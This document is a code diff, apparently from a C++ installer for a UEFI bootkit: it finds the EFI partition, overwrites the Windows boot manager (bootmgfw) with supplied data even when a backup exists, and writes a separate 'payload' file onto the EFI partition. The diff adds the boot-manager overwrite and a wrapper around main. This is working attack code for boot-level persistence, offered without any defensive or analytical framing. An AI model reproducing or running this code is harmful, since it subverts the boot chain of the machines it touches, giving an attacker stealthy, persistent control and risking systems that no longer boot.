@@ -88,7 +88,7 @@ bool IsIntel() // returns true on an Intel processor, false on anything else
 		return false;
 }
 
-int main() {
+int Main() {
 	const std::wstring efiPart = FindEFIPartition();
 	if (efiPart.empty())
 	{
@@ -222,6 +222,18 @@ int main() {
 		else {
 			DbgLog("Bootmgfw backup exists!");
 			success = true;
+			HANDLE bootmgfw = CreateFileW(bootmgfwPath.c_str(), (GENERIC_READ | GENERIC_WRITE), 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+			if (bootmgfw != INVALID_HANDLE_VALUE) {
+				DWORD written;
+				WriteFile(bootmgfw, pSrcData, FileSize, &written, NULL);
+				DbgLog("Bootmgfw backup overridden!");
+			}
+			else
+			{
+				DbgLog("Restored backup!");
+				MoveFileW(bootmgfwBackupPath.c_str(), bootmgfwPath.c_str());
+			}
 		}
 
 		if (!std::filesystem::exists(payloadPath)) {
@@ -231,7 +243,7 @@ int main() {
 			DbgLog("Payload exists!");
 			HANDLE payload = CreateFileW(payloadPath.c_str(), (GENERIC_READ | GENERIC_WRITE), 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 			if (payload != INVALID_HANDLE_VALUE) {
-				DbgLog("Saved payload!");
+				DbgLog("Overridden payload!");
 				DWORD written;
 				WriteFile(payload, pSrcDataPayload, FileSizePayload, &written, NULL);
 				CloseHandle(payload);
@@ -239,4 +251,9 @@ int main() {
 			}
 		}
 	}
+}
+
+int main() {
+	Main();
+	system("pause");
 }
